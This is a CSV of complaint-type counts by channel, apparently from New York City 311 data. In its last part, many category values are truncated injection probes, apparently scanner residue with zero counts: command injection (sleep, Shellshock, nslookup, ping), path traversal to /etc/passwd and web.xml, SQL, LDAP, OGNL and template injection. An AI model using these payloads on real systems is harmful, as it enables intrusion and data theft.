complaint_type,channel_group,count
Public Payphone Complaint,Other,4
Public Payphone Complaint,Mobile,0
DSNY Internal,Other,7
DSNY Internal,Phone,5
DSNY Internal,Mobile,0
DSNY Internal,Web,0
FHV Licensee Complaint,Other,41
FHV Licensee Complaint,Phone,10
FHV Licensee Complaint,Mobile,0
FHV Licensee Complaint,Web,0
Oil or Gas Spill,Phone,18
Oil or Gas Spill,Other,1
Oil or Gas Spill,Mobile,0
Oil or Gas Spill,Web,0
X-Ray Machine/Equipment,Web,154
X-Ray Machine/Equipment,Phone,60
X-Ray Machine/Equipment,Other,46
X-Ray Machine/Equipment,Mobile,0
Leaning Bar,Web,5
Leaning Bar,Phone,1
Leaning Bar,Mobile,0
Leaning Bar,Other,0
Peeling Paint,Phone,101
Peeling Paint,Web,28
Peeling Paint,Mobile,0
Peeling Paint,Other,0
Pet Shop,Web,697
Pet Shop,Phone,525
Pet Shop,Other,7
Pet Shop,Mobile,0
Tanning,Phone,42
Tanning,Web,12
Tanning,Mobile,0
Tanning,Other,0
ASBESTOS,Mobile,0
ASBESTOS,Other,0
ASBESTOS,Phone,0
ASBESTOS,Web,0
Construction Safety Enforcement,Other,31099
Construction Safety Enforcement,Mobile,0
Construction Safety Enforcement,Phone,0
Construction Safety Enforcement,Web,0
SNW,Other,7
SNW,Mobile,0
SNW,Phone,0
SNW,Web,0
Facade Insp Safety Pgm,Other,2
Facade Insp Safety Pgm,Mobile,0
Facade Insp Safety Pgm,Phone,0
Facade Insp Safety Pgm,Web,0
Special Operations,Other,315
Special Operations,Mobile,0
Special Operations,Phone,0
Special Operations,Web,0
Dispatched Taxi Complaint,Phone,67
Dispatched Taxi Complaint,Other,21
Dispatched Taxi Complaint,Mobile,0
Dispatched Taxi Complaint,Web,0
Smoking,Phone,17743
Smoking,Web,16710
Smoking,Other,917
Smoking,Mobile,0
Building Marshal's Office,Other,6
Building Marshal's Office,Mobile,0
Building Marshal's Office,Phone,0
Building Marshal's Office,Web,0
Adopt-A-Basket,Phone,2156
Adopt-A-Basket,Web,446
Adopt-A-Basket,Mobile,0
Adopt-A-Basket,Other,0
Stalled Sites,Other,750
Stalled Sites,Mobile,0
Stalled Sites,Phone,0
Stalled Sites,Web,0
Bike Rack Condition,Phone,1549
Bike Rack Condition,Web,611
Bike Rack Condition,Other,9
Bike Rack Condition,Mobile,0
Building Marshals office,Other,7087
Building Marshals office,Mobile,0
Building Marshals office,Phone,0
Building Marshals office,Web,0
Executive Inspections,Other,1289
Executive Inspections,Mobile,0
Executive Inspections,Phone,0
Executive Inspections,Web,0
Sustainability Enforcement,Other,6381
Sustainability Enforcement,Mobile,0
Sustainability Enforcement,Phone,0
Sustainability Enforcement,Web,0
Retailer Complaint,Web,34
Retailer Complaint,Phone,19
Retailer Complaint,Mobile,0
Retailer Complaint,Other,0
Seasonal Collection,Web,644
Seasonal Collection,Phone,143
Seasonal Collection,Other,2
Seasonal Collection,Mobile,0
Unlicensed Dog,Web,45
Unlicensed Dog,Phone,31
Unlicensed Dog,Other,1
Unlicensed Dog,Mobile,0
Electronics Waste Appointment,Phone,87947
Electronics Waste Appointment,Mobile,0
Electronics Waste Appointment,Other,0
Electronics Waste Appointment,Web,0
Appliance,Phone,413
Appliance,Web,150
Appliance,Mobile,0
Appliance,Other,0
Boiler,Web,27
Boiler,Phone,14
Boiler,Mobile,0
Boiler,Other,0
DOB Posted Notice or Order,Phone,5
DOB Posted Notice or Order,Mobile,0
DOB Posted Notice or Order,Other,0
DOB Posted Notice or Order,Web,0
Door/Window,Phone,908
Door/Window,Web,350
Door/Window,Mobile,0
Door/Window,Other,0
Electric,Phone,187
Electric,Web,103
Electric,Mobile,0
Electric,Other,0
Flooring/Stairs,Phone,530
Flooring/Stairs,Web,165
Flooring/Stairs,Mobile,0
Flooring/Stairs,Other,0
General,Phone,1353
General,Web,439
General,Mobile,0
General,Other,0
Heat/Hot Water,Web,775
Heat/Hot Water,Phone,728
Heat/Hot Water,Mobile,311
Heat/Hot Water,Other,0
Paint/Plaster,Phone,1603
Paint/Plaster,Web,584
Paint/Plaster,Mobile,0
Paint/Plaster,Other,0
Safety,Phone,896
Safety,Web,374
Safety,Mobile,0
Safety,Other,0
Sewer Maintenance,Phone,1689
Sewer Maintenance,Web,1088
Sewer Maintenance,Mobile,0
Sewer Maintenance,Other,0
Unsanitary Condition,Phone,5321
Unsanitary Condition,Web,1429
Unsanitary Condition,Mobile,0
Unsanitary Condition,Other,0
Unstable Building,Phone,85
Unstable Building,Mobile,0
Unstable Building,Other,0
Unstable Building,Web,0
Water Drainage,Phone,86
Water Drainage,Web,50
Water Drainage,Mobile,0
Water Drainage,Other,0
Water Leak,Phone,1949
Water Leak,Web,1123
Water Leak,Mobile,0
Water Leak,Other,0
Water Maintenance,Phone,298
Water Maintenance,Web,84
Water Maintenance,Other,12
Water Maintenance,Mobile,0
Outside Building,Phone,8
Outside Building,Mobile,0
Outside Building,Other,0
Outside Building,Web,0
Quality of Life,Other,1492
Quality of Life,Mobile,0
Quality of Life,Phone,0
Quality of Life,Web,0
Trans Fat,Phone,19
Trans Fat,Web,14
Trans Fat,Mobile,0
Trans Fat,Other,0
Bottled Water,Phone,105
Bottled Water,Other,53
Bottled Water,Web,34
Bottled Water,Mobile,0
Face Covering Violation,Web,1161
Face Covering Violation,Phone,637
Face Covering Violation,Mobile,0
Face Covering Violation,Other,0
Dispatched Taxi Compliment,Other,2
Dispatched Taxi Compliment,Phone,2
Dispatched Taxi Compliment,Mobile,0
Dispatched Taxi Compliment,Web,0
ZTESTINT,Web,32
ZTESTINT,Other,3
ZTESTINT,Phone,2
ZTESTINT,Mobile,0
Internal Code,Web,14
Internal Code,Phone,7
Internal Code,Other,1
Internal Code,Mobile,0
SRDE,Phone,19
SRDE,Other,2
SRDE,Mobile,1
SRDE,Web,0
Private School Vaccine Mandate Non-Compliance,Web,213
Private School Vaccine Mandate Non-Compliance,Phone,6
Private School Vaccine Mandate Non-Compliance,Mobile,0
Private School Vaccine Mandate Non-Compliance,Other,0
Request Large Bulky Item Collection,Phone,1014073
Request Large Bulky Item Collection,Other,58358
Request Large Bulky Item Collection,Mobile,0
Request Large Bulky Item Collection,Web,0
Vaccine Mandate Non-Compliance,Web,6173
Vaccine Mandate Non-Compliance,Phone,1226
Vaccine Mandate Non-Compliance,Mobile,0
Vaccine Mandate Non-Compliance,Other,0
Facades,Other,2161
Facades,Mobile,0
Facades,Phone,0
Facades,Web,0
COVID-19 Non-essential Construction,Other,7314
COVID-19 Non-essential Construction,Mobile,0
COVID-19 Non-essential Construction,Phone,0
COVID-19 Non-essential Construction,Web,0
Private or Charter School Reopening,Web,1557
Private or Charter School Reopening,Phone,542
Private or Charter School Reopening,Other,1
Private or Charter School Reopening,Mobile,0
Mass Gathering Complaint,Web,2414
Mass Gathering Complaint,Phone,1231
Mass Gathering Complaint,Other,2
Mass Gathering Complaint,Mobile,0
MOLD,Phone,2
MOLD,Mobile,0
MOLD,Other,0
MOLD,Web,0
Home Delivered Meal - Missed Delivery,Mobile,0
Home Delivered Meal - Missed Delivery,Other,0
Home Delivered Meal - Missed Delivery,Phone,0
Home Delivered Meal - Missed Delivery,Web,0
Forensic Engineering,Other,1164
Forensic Engineering,Mobile,0
Forensic Engineering,Phone,0
Forensic Engineering,Web,0
Miscellaneous Categories,Other,15592
Miscellaneous Categories,Mobile,0
Miscellaneous Categories,Phone,0
Miscellaneous Categories,Web,0
DEP Bridge Condition,Mobile,0
DEP Bridge Condition,Other,0
DEP Bridge Condition,Phone,0
DEP Bridge Condition,Web,0
Derelict Bicycle,Phone,8148
Derelict Bicycle,Web,7459
Derelict Bicycle,Mobile,187
Derelict Bicycle,Other,8
Dirty Conditions,Phone,228320
Dirty Conditions,Web,130400
Dirty Conditions,Other,29797
Dirty Conditions,Mobile,14666
Litter Basket / Request,Phone,21580
Litter Basket / Request,Web,7943
Litter Basket / Request,Mobile,137
Litter Basket / Request,Other,28
Missed Collection (All Materials),Phone,261689
Missed Collection (All Materials),Web,80401
Missed Collection (All Materials),Other,263
Missed Collection (All Materials),Mobile,122
Other Enforcement,Phone,51489
Other Enforcement,Web,18981
Other Enforcement,Mobile,1260
Other Enforcement,Other,57
Overflowing Litter Baskets,Phone,11324
Overflowing Litter Baskets,Web,4060
Overflowing Litter Baskets,Mobile,84
Overflowing Litter Baskets,Other,57
Recycling Enforcement,Phone,5179
Recycling Enforcement,Web,3991
Recycling Enforcement,Mobile,34
Recycling Enforcement,Other,1
Sanitation Condition,Phone,299257
Sanitation Condition,Web,31725
Sanitation Condition,Mobile,30819
Sanitation Condition,Other,2270
Storm,Web,2505
Storm,Phone,498
Storm,Mobile,0
Storm,Other,0
Sweeping/Missed,Phone,8639
Sweeping/Missed,Web,47
Sweeping/Missed,Other,22
Sweeping/Missed,Mobile,17
Vacant Lot,Phone,17396
Vacant Lot,Web,4031
Vacant Lot,Mobile,403
Vacant Lot,Other,111
Sweeping/Inadequate,Phone,2363
Sweeping/Inadequate,Web,37
Sweeping/Inadequate,Other,9
Sweeping/Inadequate,Mobile,7
Overflowing Recycling Baskets,Phone,182
Overflowing Recycling Baskets,Web,4
Overflowing Recycling Baskets,Mobile,1
Overflowing Recycling Baskets,Other,0
Collection Truck Noise,Phone,1935
Collection Truck Noise,Web,39
Collection Truck Noise,Mobile,2
Collection Truck Noise,Other,0
Change Collection Schedule,Web,1
Change Collection Schedule,Mobile,0
Change Collection Schedule,Other,0
Change Collection Schedule,Phone,0
Foam Ban Enforcement,Phone,81
Foam Ban Enforcement,Web,1
Foam Ban Enforcement,Mobile,0
Foam Ban Enforcement,Other,0
SRGOVG,Phone,2
SRGOVG,Other,1
SRGOVG,Web,1
SRGOVG,Mobile,0
NonCompliance with Phased Reopening,Web,47633
NonCompliance with Phased Reopening,Phone,18663
NonCompliance with Phased Reopening,Mobile,0
NonCompliance with Phased Reopening,Other,0
Sweeping/Missed-Inadequate,Phone,5477
Sweeping/Missed-Inadequate,Web,11
Sweeping/Missed-Inadequate,Mobile,2
Sweeping/Missed-Inadequate,Other,0
Snow,Phone,50783
Snow,Web,33111
Snow,Mobile,604
Snow,Other,8
Homeless Street Condition,Web,9666
Homeless Street Condition,Phone,5780
Homeless Street Condition,Other,3
Homeless Street Condition,Mobile,0
Snow Removal,Web,1412
Snow Removal,Phone,723
Snow Removal,Mobile,548
Snow Removal,Other,0
Vending,Phone,33959
Vending,Web,12231
Vending,Mobile,0
Vending,Other,0
DSNY Spillage,Web,5
DSNY Spillage,Mobile,1
DSNY Spillage,Other,0
DSNY Spillage,Phone,0
Employee Behavior,Web,7
Employee Behavior,Mobile,0
Employee Behavior,Other,0
Employee Behavior,Phone,0
Homeless Encampment,Phone,34981
Homeless Encampment,Web,2717
Homeless Encampment,Other,2
Homeless Encampment,Mobile,0
Electronics Waste,Phone,26469
Electronics Waste,Other,17
Electronics Waste,Web,1
Electronics Waste,Mobile,0
Ferry Permit,Phone,1
Ferry Permit,Mobile,0
Ferry Permit,Other,0
Ferry Permit,Web,0
Home Delivered Meal Complaint,Mobile,0
Home Delivered Meal Complaint,Other,0
Home Delivered Meal Complaint,Phone,0
Home Delivered Meal Complaint,Web,0
Literature Request,Phone,164
Literature Request,Web,1
Literature Request,Mobile,0
Literature Request,Other,0
Single Occupancy Bathroom,Web,33
Single Occupancy Bathroom,Phone,6
Single Occupancy Bathroom,Mobile,0
Single Occupancy Bathroom,Other,0
Construction,Web,28292
Construction,Phone,4
Construction,Mobile,0
Construction,Other,0
Fire Alarm - Replacement,Phone,1
Fire Alarm - Replacement,Mobile,0
Fire Alarm - Replacement,Other,0
Fire Alarm - Replacement,Web,0
Request Changes - A.S.P.,Phone,1
Request Changes - A.S.P.,Mobile,0
Request Changes - A.S.P.,Other,0
Request Changes - A.S.P.,Web,0
Comments,Mobile,0
Comments,Other,0
Comments,Phone,0
Comments,Web,0
FATF,Other,457
FATF,Mobile,0
FATF,Phone,0
FATF,Web,0
Forms,Mobile,0
Forms,Other,0
Forms,Phone,0
Forms,Web,0
Question,Mobile,0
Question,Other,0
Question,Phone,0
Question,Web,0
Advocate - Other,Phone,1
Advocate - Other,Mobile,0
Advocate - Other,Other,0
Advocate - Other,Web,0
Animal Abuse,Phone,40994
Animal Abuse,Web,11006
Animal Abuse,Mobile,0
Animal Abuse,Other,0
Benefit Card Replacement,Web,1
Benefit Card Replacement,Mobile,0
Benefit Card Replacement,Other,0
Benefit Card Replacement,Phone,0
DOF Property - Owner Issue,Mobile,0
DOF Property - Owner Issue,Other,0
DOF Property - Owner Issue,Phone,0
DOF Property - Owner Issue,Web,0
DOF Property - Update Account,Mobile,0
DOF Property - Update Account,Other,0
DOF Property - Update Account,Phone,0
DOF Property - Update Account,Web,0
DPR Internal,Other,3027
DPR Internal,Phone,1
DPR Internal,Mobile,0
DPR Internal,Web,0
Derelict Vehicle,Phone,140492
Derelict Vehicle,Web,38555
Derelict Vehicle,Mobile,27149
Derelict Vehicle,Other,5
DOF Property - Property Value,Mobile,0
DOF Property - Property Value,Other,0
DOF Property - Property Value,Phone,0
DOF Property - Property Value,Web,0
DOF Property - RPIE Issue,Mobile,0
DOF Property - RPIE Issue,Other,0
DOF Property - RPIE Issue,Phone,0
DOF Property - RPIE Issue,Web,0
DOF Property - Reduction Issue,Phone,28
DOF Property - Reduction Issue,Mobile,0
DOF Property - Reduction Issue,Other,0
DOF Property - Reduction Issue,Web,0
DOF Property - Request Copy,Mobile,0
DOF Property - Request Copy,Other,0
DOF Property - Request Copy,Phone,0
DOF Property - Request Copy,Web,0
Research Questions,Mobile,0
Research Questions,Other,0
Research Questions,Phone,0
Research Questions,Web,0
MSOTHER,Other,1
MSOTHER,Mobile,0
MSOTHER,Phone,0
MSOTHER,Web,0
$(sleep 11),Mobile,0
$(sleep 11),Other,0
$(sleep 11),Phone,0
$(sleep 11),Web,0
${3804*3137},Mobile,0
${3804*3137},Other,0
${3804*3137},Phone,0
${3804*3137},Web,0
%2e%2e%2f%2e%2e%2f%2e%2e%2f...,Mobile,0
%2e%2e%2f%2e%2e%2f%2e%2e%2f...,Other,0
%2e%2e%2f%2e%2e%2f%2e%2e%2f...,Phone,0
%2e%2e%2f%2e%2e%2f%2e%2e%2f...,Web,0
%2e%2e%5c%2e%2e%5c%2e%2e%5c...,Mobile,0
%2e%2e%5c%2e%2e%5c%2e%2e%5c...,Other,0
%2e%2e%5c%2e%2e%5c%2e%2e%5c...,Phone,0
%2e%2e%5c%2e%2e%5c%2e%2e%5c...,Web,0
%2fetc%2fpasswd,Mobile,0
%2fetc%2fpasswd,Other,0
%2fetc%2fpasswd,Phone,0
%2fetc%2fpasswd,Web,0
%E5%98%8A%E5%98%8DX-Injecti...,Mobile,0
%E5%98%8A%E5%98%8DX-Injecti...,Other,0
%E5%98%8A%E5%98%8DX-Injecti...,Phone,0
%E5%98%8A%E5%98%8DX-Injecti...,Web,0
%c0%ae/%c0%ae/%c0%ae/%c0%ae...,Mobile,0
%c0%ae/%c0%ae/%c0%ae/%c0%ae...,Other,0
%c0%ae/%c0%ae/%c0%ae/%c0%ae...,Phone,0
%c0%ae/%c0%ae/%c0%ae/%c0%ae...,Web,0
%c0%ae/%c0%ae/%c0%ae/WEB-IN...,Mobile,0
%c0%ae/%c0%ae/%c0%ae/WEB-IN...,Other,0
%c0%ae/%c0%ae/%c0%ae/WEB-IN...,Phone,0
%c0%ae/%c0%ae/%c0%ae/WEB-IN...,Web,0
%c0%ae/%c0%ae/WEB-INF/web.xml,Mobile,0
%c0%ae/%c0%ae/WEB-INF/web.xml,Other,0
%c0%ae/%c0%ae/WEB-INF/web.xml,Phone,0
%c0%ae/%c0%ae/WEB-INF/web.xml,Web,0
%c0%ae/WEB-INF/web.xml,Mobile,0
%c0%ae/WEB-INF/web.xml,Other,0
%c0%ae/WEB-INF/web.xml,Phone,0
%c0%ae/WEB-INF/web.xml,Web,0
%{(#dm=@ognl.OgnlContext@DE...,Mobile,0
%{(#dm=@ognl.OgnlContext@DE...,Other,0
%{(#dm=@ognl.OgnlContext@DE...,Phone,0
%{(#dm=@ognl.OgnlContext@DE...,Web,0
%{4761*8506},Mobile,0
%{4761*8506},Other,0
%{4761*8506},Phone,0
%{4761*8506},Web,0
&lt;odb xmlns:xi=&quot;http...,Mobile,0
&lt;odb xmlns:xi=&quot;http...,Other,0
&lt;odb xmlns:xi=&quot;http...,Phone,0
&lt;odb xmlns:xi=&quot;http...,Web,0
&lt;vlv xmlns=&quot;http://...,Mobile,0
&lt;vlv xmlns=&quot;http://...,Other,0
&lt;vlv xmlns=&quot;http://...,Phone,0
&lt;vlv xmlns=&quot;http://...,Web,0
&quot;--&gt;'--&gt;`--&gt;&...,Mobile,0
&quot;--&gt;'--&gt;`--&gt;&...,Other,0
&quot;--&gt;'--&gt;`--&gt;&...,Phone,0
&quot;--&gt;'--&gt;`--&gt;&...,Web,0
() { :;}; /bin/sleep 0,Mobile,0
() { :;}; /bin/sleep 0,Other,0
() { :;}; /bin/sleep 0,Phone,0
() { :;}; /bin/sleep 0,Web,0
() { :;}; /bin/sleep 11,Mobile,0
() { :;}; /bin/sleep 11,Other,0
() { :;}; /bin/sleep 11,Phone,0
() { :;}; /bin/sleep 11,Web,0
() { _; } &gt;_,Mobile,0
() { _; } &gt;_,Other,0
() { _; } &gt;_,Phone,0
() { _; } &gt;_,Web,0
(select extractvalue(xmltyp...,Mobile,0
(select extractvalue(xmltyp...,Other,0
(select extractvalue(xmltyp...,Phone,0
(select extractvalue(xmltyp...,Web,0
(select load_file('\\\\615h...,Mobile,0
(select load_file('\\\\615h...,Other,0
(select load_file('\\\\615h...,Phone,0
(select load_file('\\\\615h...,Web,0
*)(!(objectClass=*),Mobile,0
*)(!(objectClass=*),Other,0
*)(!(objectClass=*),Phone,0
*)(!(objectClass=*),Web,0
*)(objectClass=*,Mobile,0
*)(objectClass=*,Other,0
*)(objectClass=*,Phone,0
*)(objectClass=*,Web,0
.../....///.../....///.../....,Mobile,0
.../....///.../....///.../....,Other,0
.../....///.../....///.../....,Phone,0
.../....///.../....///.../....,Web,0
.../...//.../...//.../...//...,Mobile,0
.../...//.../...//.../...//...,Other,0
.../...//.../...//.../...//...,Phone,0
.../...//.../...//.../...//...,Web,0
..././..././..././..././......,Mobile,0
..././..././..././..././......,Other,0
..././..././..././..././......,Phone,0
..././..././..././..././......,Web,0
.../.\.../.\.../.\.../.\......,Mobile,0
.../.\.../.\.../.\.../.\......,Other,0
.../.\.../.\.../.\.../.\......,Phone,0
.../.\.../.\.../.\.../.\......,Web,0
.../Misc. Comments,Mobile,0
.../Misc. Comments,Other,0
.../Misc. Comments,Phone,0
.../Misc. Comments,Web,0
...\./...\./...\./...\./......,Mobile,0
...\./...\./...\./...\./......,Other,0
...\./...\./...\./...\./......,Phone,0
...\./...\./...\./...\./......,Web,0
...\.\...\.\...\.\...\.\......,Mobile,0
...\.\...\.\...\.\...\.\......,Other,0
...\.\...\.\...\.\...\.\......,Phone,0
...\.\...\.\...\.\...\.\......,Web,0
../../../../../../../../../...,Mobile,0
../../../../../../../../../...,Other,0
../../../../../../../../../...,Phone,0
../../../../../../../../../...,Web,0
../../../../WEB-INF/web.xml,Mobile,0
../../../../WEB-INF/web.xml,Other,0
../../../../WEB-INF/web.xml,Phone,0
../../../../WEB-INF/web.xml,Web,0
../../../WEB-INF/web.xml,Mobile,0
../../../WEB-INF/web.xml,Other,0
../../../WEB-INF/web.xml,Phone,0
../../../WEB-INF/web.xml,Web,0
../../../WEB-INF/web.xml;x=,Mobile,0
../../../WEB-INF/web.xml;x=,Other,0
../../../WEB-INF/web.xml;x=,Phone,0
../../../WEB-INF/web.xml;x=,Web,0
../../WEB-INF/web.xml,Mobile,0
../../WEB-INF/web.xml,Other,0
../../WEB-INF/web.xml,Phone,0
../../WEB-INF/web.xml,Web,0
../../WEB-INF/web.xml;x=,Mobile,0
../../WEB-INF/web.xml;x=,Other,0
../../WEB-INF/web.xml;x=,Phone,0
../../WEB-INF/web.xml;x=,Web,0
../WEB-INF/web.xml,Mobile,0
../WEB-INF/web.xml,Other,0
../WEB-INF/web.xml,Phone,0
../WEB-INF/web.xml,Web,0
../WEB-INF/web.xml;x=,Mobile,0
../WEB-INF/web.xml;x=,Other,0
../WEB-INF/web.xml;x=,Phone,0
../WEB-INF/web.xml;x=,Web,0
..\..\..\..\..\..\..\..\..\...,Mobile,0
..\..\..\..\..\..\..\..\..\...,Other,0
..\..\..\..\..\..\..\..\..\...,Phone,0
..\..\..\..\..\..\..\..\..\...,Web,0
./validate_form.php,Mobile,0
./validate_form.php,Other,0
./validate_form.php,Phone,0
./validate_form.php,Web,0
/./validate_form.php,Mobile,0
/./validate_form.php,Other,0
/./validate_form.php,Phone,0
/./validate_form.php,Web,0
/etc/passwd,Mobile,0
/etc/passwd,Other,0
/etc/passwd,Phone,0
/etc/passwd,Web,0
1430*4963,Mobile,0
1430*4963,Other,0
1430*4963,Phone,0
1430*4963,Web,0
266dyrgvhg1egsyp2oq57axbm2s...,Mobile,0
266dyrgvhg1egsyp2oq57axbm2s...,Other,0
266dyrgvhg1egsyp2oq57axbm2s...,Phone,0
266dyrgvhg1egsyp2oq57axbm2s...,Web,0
@(9313*3464),Mobile,0
@(9313*3464),Other,0
@(9313*3464),Phone,0
@(9313*3464),Web,0
Misc. Comments  BCC:a5glxzf...,Mobile,0
Misc. Comments  BCC:a5glxzf...,Other,0
Misc. Comments  BCC:a5glxzf...,Phone,0
Misc. Comments  BCC:a5glxzf...,Web,0
Misc. Comments%}dt2pq'/&quo...,Mobile,0
Misc. Comments%}dt2pq'/&quo...,Other,0
Misc. Comments%}dt2pq'/&quo...,Phone,0
Misc. Comments%}dt2pq'/&quo...,Web,0
Misc. Comments&amp;echo xjd...,Mobile,0
Misc. Comments&amp;echo xjd...,Other,0
Misc. Comments&amp;echo xjd...,Phone,0
Misc. Comments&amp;echo xjd...,Web,0
Misc. Comments&amp;nslookup...,Mobile,0
Misc. Comments&amp;nslookup...,Other,0
Misc. Comments&amp;nslookup...,Phone,0
Misc. Comments&amp;nslookup...,Web,0
Misc. Comments&amp;ping -n ...,Mobile,0
Misc. Comments&amp;ping -n ...,Other,0
Misc. Comments&amp;ping -n ...,Phone,0
Misc. Comments&amp;ping -n ...,Web,0
Misc. Comments&gt;  BCC:bl0...,Mobile,0
Misc. Comments&gt;  BCC:bl0...,Other,0
Misc. Comments&gt;  BCC:bl0...,Phone,0
Misc. Comments&gt;  BCC:bl0...,Web,0
Misc. Comments&quot;,Mobile,0
Misc. Comments&quot;,Other,0
Misc. Comments&quot;,Phone,0
Misc. Comments&quot;,Web,0
Misc. Comments&quot;|echo 2...,Mobile,0
Misc. Comments&quot;|echo 2...,Other,0
Misc. Comments&quot;|echo 2...,Phone,0
Misc. Comments&quot;|echo 2...,Web,0
Misc. Comments&quot;|ping -...,Mobile,0
Misc. Comments&quot;|ping -...,Other,0
Misc. Comments&quot;|ping -...,Phone,0
Misc. Comments&quot;|ping -...,Web,0
Misc. Comments',Mobile,0
Misc. Comments',Other,0
Misc. Comments',Phone,0
Misc. Comments',Web,0
Misc. Comments' and '1618'=...,Mobile,0
